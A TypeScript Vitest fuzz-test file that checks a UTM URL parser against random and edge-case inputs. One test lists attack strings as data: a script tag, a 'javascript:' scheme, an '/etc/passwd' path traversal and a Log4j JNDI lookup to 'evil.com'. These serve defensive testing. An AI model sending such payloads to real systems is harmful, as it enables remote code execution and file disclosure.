import { describe, it, expect } from 'vitest';
import { validateUTM, parseUTMParams } from './utmParser';

function generateRandomString(length: number, charset: string): string {
  let result = '';
  for (let i = 0; i < length; i++) {
    result += charset[Math.floor(Math.random() * charset.length)];
  }
  return result;
}

function generateFuzzURL(): string {
  const domains = [
    'example.com',
    'test.org',
    'site.io',
    'app.co',
    '127.0.0.1',
    'localhost',
    '',
    'a.b.c.d.e.f',
  ];
  
  const protocols = ['https://', 'http://', ''];
  const paths = ['', '/', '/path', '/path/to/page', '/a/b/c/d'];
  
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-%20!@#$&*()';
  
  const domain = domains[Math.floor(Math.random() * domains.length)];
  const protocol = protocols[Math.floor(Math.random() * protocols.length)];
  const path = paths[Math.floor(Math.random() * paths.length)];
  
  const params: string[] = [];
  const utmKeys = ['utm_source', 'utm_medium', 'utm_campaign', 'utm_term', 'utm_content'];
  
  // Add 0-5 UTM params
  const numParams = Math.floor(Math.random() * 6);
  for (let i = 0; i < numParams; i++) {
    const key = utmKeys[Math.floor(Math.random() * utmKeys.length)];
    const valueLength = Math.floor(Math.random() * 200);
    const value = generateRandomString(valueLength, chars);
    params.push(`${key}=${encodeURIComponent(value)}`);
  }
  
  let url = `${protocol}${domain}${path}`;
  if (params.length > 0) {
    url += '?' + params.join('&');
  }
  
  return url;
}

describe('Fuzz Tests - 1000 random inputs', () => {
  it('should not crash on any random URL', () => {
    for (let i = 0; i < 1000; i++) {
      const url = generateFuzzURL();
      
      // Should not throw
      expect(() => {
        parseUTMParams(url);
        validateUTM(url);
      }).not.toThrow();
    }
  });

  it('should produce deterministic output', () => {
    for (let i = 0; i < 1000; i++) {
      const url = generateFuzzURL();
      
      const result1 = validateUTM(url);
      const result2 = validateUTM(url);
      
      expect(result1.valid).toBe(result2.valid);
      expect(result1.violations.length).toBe(result2.violations.length);
    }
  });

  it('should handle edge case characters', () => {
    const edgeCases = [
      '\x00', '\x01', '\x1f', // Control characters
      '\x7f', '\x80', '\xff', // High bytes
      '\u0000', '\uFFFF', // Unicode extremes
      '<script>', 'javascript:', // XSS attempts
      '../../../../etc/passwd', // Path traversal
      '${jndi:ldap://evil.com}', // Log4j
    ];
    
    for (const edge of edgeCases) {
      const url = `https://example.com?utm_source=${encodeURIComponent(edge)}&utm_medium=cpc&utm_campaign=test`;
      
      expect(() => {
        validateUTM(url);
      }).not.toThrow();
    }
  });

  it('should handle very long URLs', () => {
    const longValue = 'a'.repeat(10000);
    const url = `https://example.com?utm_source=${longValue}&utm_medium=cpc&utm_campaign=test`;
    
    expect(() => {
      validateUTM(url);
    }).not.toThrow();
    
    const result = validateUTM(url);
    expect(result.valid).toBe(false);
  });

  it('should handle many query params', () => {
    const params: string[] = [];
    for (let i = 0; i < 1000; i++) {
      params.push(`param${i}=value${i}`);
    }
    params.push('utm_source=google&utm_medium=cpc&utm_campaign=test');
    
    const url = `https://example.com?${params.join('&')}`;
    
    expect(() => {
      validateUTM(url);
    }).not.toThrow();
  });
});